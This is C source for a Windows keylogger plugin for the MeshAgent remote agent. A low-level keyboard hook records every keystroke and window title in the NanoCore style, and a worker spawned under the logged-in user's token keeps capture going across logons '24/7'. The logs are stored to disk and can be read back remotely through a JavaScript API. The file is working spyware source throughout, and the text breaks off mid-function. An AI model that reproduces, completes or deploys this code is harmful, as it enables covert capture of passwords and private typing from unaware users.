/* Native Windows keylogger for MeshAgent (mckeylog plugin).
 *
 * A WH_KEYBOARD_LL hook on a dedicated thread captures every key press
 * (including from the interactive user session when the agent runs as
 * a service). A stateful formatter turns the raw key stream into
 * readable lines (NanoCore keylogger style):
 *
 *     YYYY-MM-DD HH:MM:SS  -  Window: <foreground window>   (window changed)
 *     YYYY-MM-DD HH:MM:SS  -  <typed text>
 *
 * Typed text accumulates in a buffer and is flushed as a line on Enter,
 * on a window change, when the buffer approaches its limit, or after
 * KEYLOG_FMT_STALE_MS of idle time. Backspace removes the last UTF-8
 * character from the pending text; other special keys are appended
 * inline as [Name] (Ctrl+letter as [Ctrl+X]). Lines are appended to a
 * rolling, date-named log file
 * (keylog-YYYY-MM-DD.log, rotated to -1/-2 at the size limit) in the
 * agent directory, and the most recent lines are kept in an in-memory
 * ring buffer that JavaScript polls for live streams.
 *
 * JavaScript API (require('keylogger')):
 *     start(opts?)   opts: { logDir?: string, maxFileSizeKB?: int, windowTitles?: bool }
 *     stop()
 *     getState()     { available, running, totalKeys, bufferLines, bufferSize, dir, currentFile, lastError }
 *     read(maxLines) array of pending line strings (0 = all pending), oldest first
 *     listFiles()    array of { name, size, mtime } for keylog-*.log, newest first
 *     readFile(name, offset, maxBytes) { data (base64), size, bytes, done }
 */
#include "ILibDuktape_Keylogger.h"
#include "ILibDuktape_Helpers.h"
#include "ILibDuktapeModSearch.h"

#ifdef WIN32

#include <windows.h>
#include <WtsApi32.h>
#include <sddl.h>
#ifndef LLKHF_REPEAT
#define LLKHF_REPEAT 0x0001
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#define KEYLOG_RING_LINES 4096
#define KEYLOG_LINE_MAX 384
#define KEYLOG_WINDOW_MAX 160
#define KEYLOG_NAME_MAX 260
#define KEYLOG_PATH_MAX 1024
#define KEYLOG_DEFAULT_MAX_FILE (10 * 1024 * 1024)
#define KEYLOG_MIN_MAX_FILE (1024 * 1024)
#define KEYLOG_MAX_MAX_FILE (256 * 1024 * 1024)
#define KEYLOG_MAX_LIST 128
#define KEYLOG_STOP_WAIT_MS 10000
#define KEYLOG_PIPE_NAME L"\\\\.\\pipe\\mckeylog"
#define KEYLOG_PIPE_RECORD 400
#define KEYLOG_PIPE_BUFFER 65536
#define KEYLOG_SPAWN_RETRY_MS 3000

typedef struct KeylogLine
{
    unsigned int seq;
    char text[KEYLOG_LINE_MAX];
} KeylogLine;

typedef struct KeylogFile
{
    char name[KEYLOG_NAME_MAX];
    unsigned long long size;
    unsigned long long mtime;
} KeylogFile;

typedef struct Keylog
{
    CRITICAL_SECTION cs;
    volatile LONG ready;
    volatile LONG running;
    HANDLE stopEvent;
    HANDLE thread;

    KeylogLine ring[KEYLOG_RING_LINES];
    unsigned int ringHead;
    unsigned int ringCount;
    unsigned int seq;

    char dir[KEYLOG_NAME_MAX];
    char currentFile[KEYLOG_NAME_MAX];
    char currentDate[16];
    FILE *current;
    unsigned long long currentSize;
    unsigned long long maxFileSize;
    int windowTitles;

    unsigned long long totalKeys;
    char lastError[KEYLOG_LINE_MAX];

    /* User-session worker (only used when the agent runs in session 0). */
    HANDLE pipeRead;
    HANDLE workerProc;
    DWORD workerPid;
} Keylog;

static Keylog g_kl;

/* ------------------------------------------------------------------ */
/* Small helpers                                                       */
/* ------------------------------------------------------------------ */

static void Keylog_EnsureInit(void)
{
    if (InterlockedCompareExchange(&g_kl.ready, 1, 0) == 0)
    {
        InitializeCriticalSection(&g_kl.cs);
        g_kl.stopEvent = CreateEventW(NULL, TRUE, TRUE, NULL);
        g_kl.pipeRead = NULL;
        g_kl.workerProc = NULL;
        g_kl.workerPid = 0;
        g_kl.maxFileSize = KEYLOG_DEFAULT_MAX_FILE;
        g_kl.currentDate[0] = 0;
        g_kl.dir[0] = '.';
        g_kl.dir[1] = 0;
    }
}

static void Keylog_SetError(const char *msg)
{
    if (msg != NULL) { snprintf(g_kl.lastError, sizeof(g_kl.lastError), "%s", msg); }
    else { g_kl.lastError[0] = 0; }
}

static void Keylog_WideToUtf8(const wchar_t *src, char *dst, int dstLen)
{
    int n = WideCharToMultiByte(CP_UTF8, 0, src, -1, dst, dstLen - 1, NULL, NULL);
    if (n > 0) { dst[n - 1] = 0; }
    else { dst[0] = 0; }
}

static void Keylog_Utf8ToWide(const char *src, wchar_t *dst, int dstLen)
{
    MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, src, -1, dst, dstLen);
}

/* Directory of the agent executable (where the log files live by default). */
static void Keylog_DefaultDir(char *out, int outLen)
{
    wchar_t w[1024];
    wchar_t *slash;
    char tmp[KEYLOG_NAME_MAX];
    int n = GetModuleFileNameW(NULL, w, (int)(sizeof(w) / sizeof(w[0])));
    if (n <= 0) { snprintf(out, outLen, "."); return; }
    slash = wcsrchr(w, L'\\');
    if (slash != NULL) { *slash = 0; }
    Keylog_WideToUtf8(w, tmp, sizeof(tmp));
    snprintf(out, outLen, "%s", tmp);
}

static void Keylog_FilePath(char *out, int outLen, const char *fileName)
{
    snprintf(out, outLen, "%s\\%s", g_kl.dir, fileName);
}

static int Keylog_ValidFileName(const char *name)
{
    int i;
    if (strncmp(name, "keylog-", 7) != 0) { return 0; }
    i = 7;
    if ((name[i + 0] < '0' || name[i + 0] > '9') || (name[i + 1] < '0' || name[i + 1] > '9') ||
        (name[i + 2] < '0' || name[i + 2] > '9') || (name[i + 3] < '0' || name[i + 3] > '9')) { return 0; }
    i += 4;
    if (name[i] != '-') { return 0; }
    i += 1;
    if ((name[i] < '0' || name[i] > '9') || (name[i + 1] < '0' || name[i + 1] > '9')) { return 0; }
    i += 2;
    if (name[i] != '-') { return 0; }
    i += 1;
    if ((name[i] < '0' || name[i] > '9') || (name[i + 1] < '0' || name[i + 1] > '9')) { return 0; }
    i += 2;
    if (strcmp(name + i, ".log") == 0) { return 1; }
    if (strcmp(name + i, "-1.log") == 0) { return 1; }
    if (strcmp(name + i, "-2.log") == 0) { return 1; }
    return 0;
}

static unsigned long long Keylog_FileTimeToUtcMs(const FILETIME *ft)
{
    ULARGE_INTEGER v;
    v.HighPart = ft->dwHighDateTime;
    v.LowPart = ft->dwLowDateTime;
    if (v.QuadPart < 116444736000000000ULL) { return 0; }
    return (v.QuadPart - 116444736000000000ULL) / 10000ULL;
}

/* ------------------------------------------------------------------ */
/* Line formatting                                                     */
/* ------------------------------------------------------------------ */

static const struct
{
    WORD vk;
    const char *name;
} g_vkNames[] =
{
    { 0x08, "[Backspace]" }, { 0x09, "[Tab]" }, { 0x0A, "[VerticalTab]" }, { 0x0C, "[Clear]" },
    { 0x0D, "[Enter]" }, { 0x10, "[Shift]" }, { 0x11, "[Ctrl]" }, { 0x12, "[Alt]" },
    { 0x13, "[Pause]" }, { 0x14, "[CapsLock]" }, { 0x15, "[Kana]" }, { 0x16, "[Junja]" },
    { 0x17, "[Final]" }, { 0x18, "[Hanja]" }, { 0x19, "[Kanji]" }, { 0x1B, "[Esc]" },
    { 0x21, "[PgUp]" }, { 0x22, "[PgDn]" }, { 0x23, "[End]" }, { 0x24, "[Home]" },
    { 0x25, "[Left]" }, { 0x26, "[Up]" }, { 0x27, "[Right]" }, { 0x28, "[Down]" },
    { 0x29, "[Select]" }, { 0x2A, "[Print]" }, { 0x2B, "[Execute]" }, { 0x2C, "[PrintScreen]" },
    { 0x2D, "[Insert]" }, { 0x2E, "[Delete]" }, { 0x2F, "[Help]" },
    { 0x5B, "[LWin]" }, { 0x5C, "[RWin]" }, { 0x5D, "[App]" }, { 0x5F, "[Sleep]" },
    { 0x6A, "[Numpad*]" }, { 0x6B, "[Numpad+]" }, { 0x6C, "[Numpad,]" }, { 0x6D, "[Numpad-]" },
    { 0x6E, "[Numpad.]" }, { 0x6F, "[Numpad/]" },
    { 0x90, "[NumLock]" }, { 0x91, "[ScrollLock]" },
    { 0xA0, "[LShift]" }, { 0xA1, "[RShift]" }, { 0xA2, "[LCtrl]" }, { 0xA3, "[RCtrl]" },
    { 0xA4, "[LAlt]" }, { 0xA5, "[RAlt]" }
};

static void Keylog_KeyName(WORD vk, char *out, int outLen)
{
    unsigned int i;
    for (i = 0; i < (unsigned int)(sizeof(g_vkNames) / sizeof(g_vkNames[0])); i++)
    {
        if (g_vkNames[i].vk == vk)
        {
            snprintf(out, outLen, "%s", g_vkNames[i].name);
            return;
        }
    }
    if ((vk >= 0x70) && (vk <= 0x87))
    {
        snprintf(out, outLen, "[F%u]", (unsigned int)(vk - 0x70 + 1));
        return;
    }
    snprintf(out, outLen, "[VK_0x%02X]", (unsigned int)vk);
}

static int Keylog_TryChar(WORD vk, WORD scan, DWORD hookFlags, wchar_t *wc)
{
    BYTE state[256];
    HKL hkl;
    int n;
    memset(state, 0, sizeof(state));
    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) { state[VK_SHIFT] = 0x80; }
    if (GetAsyncKeyState(VK_CONTROL) & 0x8000) { state[VK_CONTROL] = 0x80; }
    if (GetAsyncKeyState(VK_MENU) & 0x8000) { state[VK_MENU] = 0x80; }
    if (GetAsyncKeyState(VK_LWIN) & 0x8000) { state[VK_LWIN] = 0x80; }
    if (GetAsyncKeyState(VK_RWIN) & 0x8000) { state[VK_RWIN] = 0x80; }
    state[VK_CAPITAL] = (BYTE)(GetKeyState(VK_CAPITAL) & 1);
    state[VK_NUMLOCK] = (BYTE)(GetKeyState(VK_NUMLOCK) & 1);
    state[VK_SCROLL] = (BYTE)(GetKeyState(VK_SCROLL) & 1);
    if ((hookFlags & 0x01) != 0) { state[0xFF] = 0x80; }
    hkl = GetKeyboardLayout(0);
    n = ToUnicodeEx(vk, scan, state, wc, 2, 0, hkl);
    return n;
}

struct Keylog_TopWin
{
    HWND top;
};

static BOOL CALLBACK Keylog_TopWinProc(HWND h, LPARAM lp)
{
    struct Keylog_TopWin *ctx = (struct Keylog_TopWin*)(uintptr_t)lp;
    DWORD pid = 0;
    DWORD sess = 0;
    DWORD tid = GetWindowThreadProcessId(h, &pid);
    if (tid == 0) { return TRUE; }
    /* Skip windows owned by service-session (session 0) processes. */
    if (ProcessIdToSessionId(pid, &sess) == 0 && sess == 0) { return TRUE; }
    if (!IsWindowVisible(h)) { return TRUE; }
    if (IsIconic(h)) { return TRUE; }
    if (GetWindow(h, GW_OWNER) != NULL) { return TRUE; }
    if ((GetWindowLongPtrW(h, GWL_EXSTYLE) & (WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE)) != 0) { return TRUE; }
    if (GetWindowTextW(h, NULL, 0) <= 0) { return TRUE; }
    ctx->top = h;
    return FALSE; /* Keep the top-most candidate only. */
}

/* Best effort foreground window title. When the agent runs as a service
 * (session 0) GetForegroundWindow returns NULL, so fall back to the
 * top-most visible, titled window of an interactive session. */
static void Keylog_WindowTitle(char *out, int outLen)
{
    HWND h = NULL;
    wchar_t w[KEYLOG_WINDOW_MAX / 2 + 1];
    int n;
    int c;
    out[0] = 0;
    if (!g_kl.windowTitles) { return; }
    h = GetForegroundWindow();
    if (h == NULL)
    {
        struct Keylog_TopWin ctx;
        ctx.top = NULL;
        EnumWindows(Keylog_TopWinProc, (LPARAM)(uintptr_t)&ctx);
        h = ctx.top;
    }
    if (h == NULL) { return; }
    n = GetWindowTextW(h, w, (int)(sizeof(w) / sizeof(w[0])) - 1);
    if (n <= 0) { return; }
    c = WideCharToMultiByte(CP_UTF8, 0, w, n, out, outLen - 1, NULL, NULL);
    if (c > 0) { out[c] = 0; }
    else { out[0] = 0; }
}

/* ------------------------------------------------------------------ */
/* Log file                                                            */
/* ------------------------------------------------------------------ */

static void Keylog_CloseCurrent(void)
{
    if (g_kl.current != NULL)
    {
        fflush(g_kl.current);
        fclose(g_kl.current);
        g_kl.current = NULL;
    }
    g_kl.currentFile[0] = 0;
}

static void Keylog_OpenCurrent(void)
{
    char name[KEYLOG_NAME_MAX];
    char path[KEYLOG_PATH_MAX];
    long end;
    snprintf(name, sizeof(name), "keylog-%s.log", g_kl.currentDate);
    Keylog_FilePath(path, sizeof(path), name);
    g_kl.current = fopen(path, "ab");
    if (g_kl.current == NULL)
    {
        Keylog_SetError("Could not open the keylog file for writing");
        return;
    }
    end = ftell(g_kl.current);
    if (end < 0) { end = 0; }
    g_kl.currentSize = (unsigned long long)end;
    snprintf(g_kl.currentFile, sizeof(g_kl.currentFile), "%s", name);
    Keylog_SetError(NULL);
}

static void Keylog_RotateSize(void)
{
    char nameBase[KEYLOG_NAME_MAX];
    char name1[KEYLOG_NAME_MAX + 8];
    char name2[KEYLOG_NAME_MAX + 8];
    char pathA[KEYLOG_PATH_MAX];
    char pathB[KEYLOG_PATH_MAX];
    Keylog_CloseCurrent();
    snprintf(nameBase, sizeof(nameBase), "keylog-%s.log", g_kl.currentDate);
    snprintf(name1, sizeof(name1), "keylog-%s-1.log", g_kl.currentDate);
    snprintf(name2, sizeof(name2), "keylog-%s-2.log", g_kl.currentDate);
    Keylog_FilePath(pathA, sizeof(pathA), name2);
    remove(pathA);
    Keylog_FilePath(pathA, sizeof(pathA), name1);
    Keylog_FilePath(pathB, sizeof(pathB), name2);
    rename(pathA, pathB);
    Keylog_FilePath(pathA, sizeof(pathA), nameBase);
    Keylog_FilePath(pathB, sizeof(pathB), name1);
    rename(pathA, pathB);
    Keylog_OpenCurrent();
}

/* ------------------------------------------------------------------ */
/* Capture (hook thread)                                               */
/* ------------------------------------------------------------------ */

/* Append-only debug log (diagnosing session-0 attach / hook issues). */
static void Keylog_Dbg(const char *fmt, ...)
{
    char path[KEYLOG_PATH_MAX];
    char msg[256];
    char ts[32];
    va_list ap;
    SYSTEMTIME st;
    FILE *f;
    va_start(ap, fmt);
    vsnprintf(msg, sizeof(msg), fmt, ap);
    va_end(ap);
    GetLocalTime(&st);
    snprintf(ts, sizeof(ts), "%02u:%02u:%02u.%03u",
        (unsigned int)st.wHour, (unsigned int)st.wMinute,
        (unsigned int)st.wSecond, (unsigned int)st.wMilliseconds);
    snprintf(path, sizeof(path), "%s\\keylog-debug.log", g_kl.dir);
    f = fopen(path, "ab");
    if (f == NULL) { return; }
    fprintf(f, "%s %s\n", ts, msg);
    fclose(f);
}

static void Keylog_DeskName(HDESK d, char *out, int outLen)
{
    wchar_t w[64];
    if (d == NULL)
    {
        snprintf(out, outLen, "(null)");
        return;
    }
    if (GetUserObjectInformationW((HANDLE)d, UOI_NAME, w, 63, NULL) != FALSE)
    {
        Keylog_WideToUtf8(w, out, outLen);
    }
    else
    {
        snprintf(out, outLen, "(err)");
    }
}

/* Attach the calling thread to the input desktop of the session that is
 * currently attached to the console. When the agent runs as a service in
 * session 0, its threads sit on the service-session desktop where no
 * interactive keyboard input arrives, so a low-level hook installed there
 * never sees the user's keys. OpenInputDesktop resolves to the active
 * session's input desktop, which makes the hook (and GetForegroundWindow /
 * EnumWindows on this thread) see the interactive user's input. This is the
 * same pattern the agent's KVM module uses. It is a no-op when the agent
 * already runs in an interactive session. */
static void Keylog_AttachToInputDesktop(void)
{
    HDESK input = OpenInputDesktop(0, TRUE,
        DESKTOP_CREATEMENU | DESKTOP_CREATEWINDOW | DESKTOP_ENUMERATE |
        DESKTOP_HOOKCONTROL | DESKTOP_WRITEOBJECTS | DESKTOP_READOBJECTS |
        DESKTOP_SWITCHDESKTOP | GENERIC_WRITE);
    DWORD errIn = GetLastError();
    HDESK old;
    static DWORD lastDbg = 0;
    DWORD now = GetTickCount();
    char n1[32];
    char n2[32];
    int logThis = (lastDbg == 0) || ((now - lastDbg) >= 15000) || (input != NULL);
    if (logThis) { lastDbg = now; }

    if (input == NULL)
    {
        if (logThis) { Keylog_Dbg("attach: OpenInputDesktop FAILED err=%lu", (unsigned long)errIn); }
        return;
    }
    old = GetThreadDesktop(GetCurrentThreadId());
    if (logThis)
    {
        Keylog_DeskName(input, n1, sizeof(n1));
        Keylog_DeskName(old, n2, sizeof(n2));
        Keylog_Dbg("attach: input=[%s] old=[%s] same=%d", n1, n2, (int)(old == input));
    }
    if (old == input)
    {
        if (old != NULL) { CloseDesktop(old); }
        CloseDesktop(input);
        return;
    }
    if (SetThreadDesktop(input) == FALSE)
    {
        DWORD errSet = GetLastError();
        /* Usually ERROR_ACCESS_DENIED when the thread is already attached
         * to this very desktop; the current attachment stays in place. */
        if (logThis) { Keylog_Dbg("attach: SetThreadDesktop FAILED err=%lu", (unsigned long)errSet); }
        CloseDesktop(input);
    }
    else
    {
        if (logThis)
        {
            Keylog_DeskName(GetThreadDesktop(GetCurrentThreadId()), n1, sizeof(n1));
            Keylog_Dbg("attach: SetThreadDesktop OK now=[%s]", n1);
        }
    }
    if (old != NULL) { CloseDesktop(old); }
}

/* ------------------------------------------------------------------ */
/* Stateful formatter (NanoCore keylogger style)                       */
/*                                                                     */
/* Each key event is fed to Keylog_FormatKey, which accumulates        */
/* printable characters in a text buffer and emits 0..2 fully formed   */
/* lines: a "Window: <title>" marker when the foreground window        */
/* changes (flushing pending text first) and the accumulated text when */
/* it is closed off by Enter, by a window change, when the buffer      */
/* approaches KEYLOG_FMT_TEXT_MAX, or after KEYLOG_FMT_STALE_MS of     */
/* idle time (Keylog_FormatTick, called from the pump loops).          */
/* Backspace strips the last UTF-8 character of the pending text;      */
/* other special keys are appended inline as [Name], Ctrl+letter as    */
/* [Ctrl+X]. Modifier keys are not logged on their own.                */
/*                                                                     */
/* Every line is prefixed with "YYYY-MM-DD HH:MM:SS  -  " (Keylog_     */
/* StoreLine derives the log file date from the first 10 characters).  */
/* Lines stay under KEYLOG_PIPE_RECORD so a single pipe record can     */
/* carry one. The worker-side and agent-side formatters are each       */
/* touched by a single thread only (the LL hook callback is delivered  */
/* on the thread that installed the hook, which is also the pump       */
/* loop thread).                                                       */
/* ------------------------------------------------------------------ */

#define KEYLOG_FMT_TEXT_MAX 320
#define KEYLOG_FMT_STALE_MS 1500
#define KEYLOG_FMT_TICK_MS 250

typedef struct KeylogEmit
{
    char text[KEYLOG_LINE_MAX + 1];
    unsigned short keys; /* key events this line represents (0 = marker) */
} KeylogEmit;

typedef struct KeylogFormatter
{
    char window[KEYLOG_WINDOW_MAX + 1];
    char text[KEYLOG_FMT_TEXT_MAX + 1];
    int textLen;
    unsigned int keysSinceFlush;
    DWORD lastActivity; /* 0 while the buffer is empty */
} KeylogFormatter;

static KeylogFormatter g_fmt;

static void Keylog_FmtReset(void)
{
    memset(&g_fmt, 0, sizeof(g_fmt));
}

static void Keylog_FmtTs(char *ts, int tsLen)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(ts, tsLen, "%04u-%02u-%02u %02u:%02u:%02u",
        (unsigned int)st.wYear, (unsigned int)st.wMonth, (unsigned int)st.wDay,
        (unsigned int)st.wHour, (unsigned int)st.wMinute, (unsigned int)st.wSecond);
}

static void Keylog_FmtEmit(KeylogEmit *out, int *outCount, unsigned short keys, const char *ts, const char *body)
{
    if (*outCount < 3)
    {
        snprintf(out[*outCount].text, KEYLOG_LINE_MAX + 1, "%s  -  %s", ts, body);
        out[*outCount].keys = keys;
        (*outCount)++;
    }
}

static void Keylog_FmtFlushText(KeylogFormatter *f, KeylogEmit *out, int *outCount, const char *ts)
{
    if (f->textLen > 0)
    {
        f->text[f->textLen] = 0;
        Keylog_FmtEmit(out, outCount, (unsigned short)f->keysSinceFlush, ts, f->text);
        f->textLen = 0;
        f->text[0] = 0;
        f->keysSinceFlush = 0;
    }
}

static void Keylog_FmtAppend(KeylogFormatter *f, const char *s, KeylogEmit *out, int *outCount, const char *ts)
{
    int len = (int)strlen(s);
    if (len > KEYLOG_FMT_TEXT_MAX) { len = KEYLOG_FMT_TEXT_MAX; }
    if ((f->textLen + len) > KEYLOG_FMT_TEXT_MAX)
    {
        /* Buffer nearly full: flush what is pending, then start a new one. */
        Keylog_FmtFlushText(f, out, outCount, ts);
    }
    if (len > (KEYLOG_FMT_TEXT_MAX - f->textLen)) { len = (KEYLOG_FMT_TEXT_MAX - f->textLen); }
    if (len > 0)
    {
        memcpy(f->text + f->textLen, s, (size_t)len);
        f->textLen += len;
        f->text[f->textLen] = 0;
    }
}

/* Feed one physical key event into the formatter. Returns the number of
 * lines produced in out (0..2); the caller stores or relays each line. */
static int Keylog_FormatKey(WORD vk, WORD scan, DWORD flags, KeylogEmit out[3])
{
    KeylogFormatter *f = &g_fmt;
    char ts[32];
    char buf[32];
    char window[KEYLOG_WINDOW_MAX + 1];
    wchar_t wc[2];
    int count = 0;
    int n;
    int charCount;
    int isMod;
    int isCtrl;

    static volatile LONG s_capCount = 0;
    LONG nc;
    nc = InterlockedIncrement(&s_capCount);
    if (nc <= 5)
    {
        Keylog_Dbg("capture #%ld vk=0x%02x", (long)nc, (unsigned int)vk);
    }

    isCtrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
    isMod = (vk == VK_SHIFT || vk == VK_CONTROL || vk == VK_MENU ||
             vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_LCONTROL || vk == VK_RCONTROL ||
             vk == VK_LMENU || vk == VK_RMENU || vk == VK_LWIN || vk == VK_RWIN);
    Keylog_FmtTs(ts, sizeof(ts));

    /* Foreground window changed: close off the pending text, then mark it. */
    if (!isMod && (vk != 0x08))
    {
        Keylog_WindowTitle(window, sizeof(window));
        if ((window[0] != 0) && (strcmp(f->window, window) != 0))
        {
            char body[KEYLOG_LINE_MAX];
            Keylog_FmtFlushText(f, out, &count, ts);
            snprintf(body, sizeof(body), "Window: %s", window);
            Keylog_FmtEmit(out, &count, 0, ts, body);
            snprintf(f->window, sizeof(f->window), "%s", window);
        }
    }

    n = Keylog_TryChar(vk, scan, flags, wc);
    charCount = 0;
    if ((n >= 1) && (wc[0] >= 0x20))
    {
        if ((wc[0] & 0xFC00) == 0) { charCount = 1; }
        else if (((wc[0] & 0xFC00) == 0xD800) && (n == 2) && ((wc[1] & 0xFC00) == 0xDC00)) { charCount = 2; }
    }

    if (isCtrl && ((vk >= 'A') && (vk <= 'Z')))
    {
        /* Ctrl+letter shortcuts: ToUnicodeEx usually yields no character,
         * so record the combo explicitly. */
        snprintf(buf, sizeof(buf), "[Ctrl+%c]", (char)vk);
        Keylog_FmtAppend(f, buf, out, &count, ts);
    }
    else if (isCtrl && ((vk >= '0') && (vk <= '9') || (vk >= VK_NUMPAD0) && (vk <= VK_NUMPAD9)))
    {
        char d = (vk <= '9') ? (char)vk : (char)('0' + (vk - VK_NUMPAD0));
        snprintf(buf, sizeof(buf), "[Ctrl+%c]", d);
        Keylog_FmtAppend(f, buf, out, &count, ts);
    }
    else if (charCount > 0)
    {
        wchar_t wbuf[3];
        char utf8[8];
        int cl;
        wbuf[0] = wc[0];
        wbuf[1] = wc[1];
        cl = WideCharToMultiByte(CP_UTF8, 0, wbuf, charCount, utf8, (int)sizeof(utf8) - 1, NULL, NULL);
        if (cl > 0)
        {
            utf8[cl] = 0;
            Keylog_FmtAppend(f, utf8, out, &count, ts);
        }
    }
    else if (vk == 0x0D)
    {
        /* Enter: the line break itself closes the current line. */
        Keylog_FmtFlushText(f, out, &count, ts);
    }
    else if (vk == 0x08)
    {
        /* Backspace: undo the last UTF-8 character. */
        int i = f->textLen - 1;
        while ((i >= 0) && ((f->text[i] & 0xC0) == 0x80)) { i--; }
        f->textLen = (i >= 0) ? i : 0;
        f->text[f->textLen] = 0;
    }
    else if ((n >= 0) && !isMod)
    {
        /* Other special keys inline: [Tab] [Up] [F5] [Esc] [Delete] ... */
        char name[64];
        Keylog_KeyName(vk, name, (int)sizeof(name));
        snprintf(buf, sizeof(buf), "%s%s", isCtrl ? "Ctrl+" : "", name);
        Keylog_FmtAppend(f, buf, out, &count, ts);
    }

    f->keysSinceFlush++;
    f->lastActivity = GetTickCount();
    return count;
}

/* Idle-time flush. Call periodically (~KEYLOG_FMT_TICK_MS); returns the
 * number of lines produced (0 or 1). */
static int Keylog_FormatTick(KeylogEmit out[2])
{
    KeylogFormatter *f = &g_fmt;
    char ts[32];
    int count = 0;
    if ((f->textLen > 0) && ((GetTickCount() - f->lastActivity) >= KEYLOG_FMT_STALE_MS))
    {
        Keylog_FmtTs(ts, sizeof(ts));
        Keylog_FmtFlushText(f, out, &count, ts);
    }
    return count;
}

/* Flush any pending text and reset the formatter (used on stop/start). */
static int Keylog_FormatFlushAll(KeylogEmit out[2])
{
    KeylogFormatter *f = &g_fmt;
    char ts[32];
    int count = 0;
    Keylog_FmtTs(ts, sizeof(ts));
    Keylog_FmtFlushText(f, out, &count, ts);
    f->window[0] = 0;
    return count;
}

/* Store one formatted line in the ring buffer and the rolling log file. */
static void Keylog_StoreLine(const char *line)
{
    EnterCriticalSection(&g_kl.cs);
    {
        char date[16];
        unsigned int idx = (g_kl.ringHead + g_kl.ringCount) % KEYLOG_RING_LINES;
        if (g_kl.ringCount == KEYLOG_RING_LINES)
        {
            g_kl.ringHead = (g_kl.ringHead + 1) % KEYLOG_RING_LINES;
            idx = (g_kl.ringHead + g_kl.ringCount) % KEYLOG_RING_LINES;
        }
        g_kl.ring[idx].seq = g_kl.seq++;
        strncpy(g_kl.ring[idx].text, line, KEYLOG_LINE_MAX - 1);
        g_kl.ring[idx].text[KEYLOG_LINE_MAX - 1] = 0;
        if (g_kl.ringCount < KEYLOG_RING_LINES) { g_kl.ringCount++; }

        snprintf(date, sizeof(date), "%s", line);
        date[10] = 0;
        if (strcmp(date, g_kl.currentDate) != 0)
        {
            Keylog_CloseCurrent();
            snprintf(g_kl.currentDate, sizeof(g_kl.currentDate), "%s", date);
            Keylog_OpenCurrent();
        }
        if (g_kl.current != NULL)
        {
            size_t len = strlen(line);
            /* Newline-terminated so the log files are plain text that any
             * editor or script can read. */
            fwrite(line, 1, len, g_kl.current);
            fputc('\n', g_kl.current);
            fflush(g_kl.current);
            g_kl.currentSize += len + 1;
            if (g_kl.currentSize >= g_kl.maxFileSize) { Keylog_RotateSize(); }
        }
    }
    LeaveCriticalSection(&g_kl.cs);
}

static void Keylog_CaptureKey(WORD vk, WORD scan, DWORD flags)
{
    KeylogEmit e[3];
    int n = Keylog_FormatKey(vk, scan, flags, e);
    int i;
    if (n > 0)
    {
        EnterCriticalSection(&g_kl.cs);
        for (i = 0; i < n; i++) { g_kl.totalKeys += e[i].keys; }
        LeaveCriticalSection(&g_kl.cs);
    }
    for (i = 0; i < n; i++)
    {
        Keylog_StoreLine(e[i].text);
    }
}

static LRESULT CALLBACK Keylog_HookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    static volatile LONG s_cbCount = 0;
    LONG n;
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        if ((kb->flags & LLKHF_REPEAT) == 0)
        {
            Keylog_CaptureKey((WORD)kb->vkCode, (WORD)kb->scanCode, kb->flags);
        }
    }
    n = InterlockedIncrement(&s_cbCount);
    if (n <= 40)
    {
        Keylog_Dbg("hook cb #%ld nCode=%d w=0x%lx", (long)n, (int)nCode, (unsigned long)wParam);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/* ------------------------------------------------------------------ */
/* User-session worker                                                 */
/*                                                                     */
/* From a session 0 (service) context OpenInputDesktop cannot reach    */
/* the console session's input desktop, so a low-level hook installed  */
/* here never sees the user's keys. The fix is a small worker process  */
/* (this same executable, launched as "MeshAgent.exe keylog-worker")   */
/* created with CreateProcessAsUser on the console user's token. The   */
/* worker lives in the interactive session, installs the same hook     */
/* (naturally on that session's desktop) and sends each formatted line */
/* to the agent over the named pipe KEYLOG_PIPE_NAME. The agent then   */
/* stores the line exactly as if its own hook had captured it. The     */
/* worker dies when the user logs off; the agent re-spawns it on the   */
/* next logon, so keylogging keeps running 24/7.                       */
/* ------------------------------------------------------------------ */

static HANDLE g_workerPipe = INVALID_HANDLE_VALUE;

/* Send one formatted line to the agent. Record layout: a 2-byte little-
 * endian key count (0 for window markers) followed by the line text. */
static void Keylog_WorkerSend(const KeylogEmit *e)
{
    unsigned char rec[KEYLOG_PIPE_RECORD];
    DWORD wr = 0;
    memset(rec, 0, sizeof(rec));
    rec[0] = (unsigned char)(e->keys & 0xFF);
    rec[1] = (unsigned char)((e->keys >> 8) & 0xFF);
    strncpy((char*)(rec + 2), e->text, KEYLOG_PIPE_RECORD - 3);
    if (WriteFile(g_workerPipe, rec, sizeof(rec), &wr, NULL) == FALSE || wr != (DWORD)sizeof(rec))
    {
        Keylog_Dbg("worker: pipe write failed err=%lu, exiting", (unsigned long)GetLastError());
        exit(1);
    }
}

static LRESULT CALLBACK Keylog_WorkerHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT*)lParam;
        if ((kb->flags & LLKHF_REPEAT) == 0)
        {
            KeylogEmit e[3];
            int n = Keylog_FormatKey((WORD)kb->vkCode, (WORD)kb->scanCode, kb->flags, e);
            int i;
            for (i = 0; i < n; i++)
            {
                Keylog_WorkerSend(&e[i]);
            }
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int ILibDuktape_KeyloggerWorker_Run(int argc, char **argv)
{
    int windowTitles = 1;
    HHOOK hook;
    MSG msg;
    DWORD lastTick = 0;

    (void)argc;
    if ((argc > 2) && (argv[2] != NULL) && (argv[2][0] == '0')) { windowTitles = 0; }
    Keylog_EnsureInit();
    Keylog_DefaultDir(g_kl.dir, sizeof(g_kl.dir));
    g_kl.windowTitles = windowTitles;

    /* Connect to the agent's pipe (it creates it before spawning us). */
    g_workerPipe = INVALID_HANDLE_VALUE;
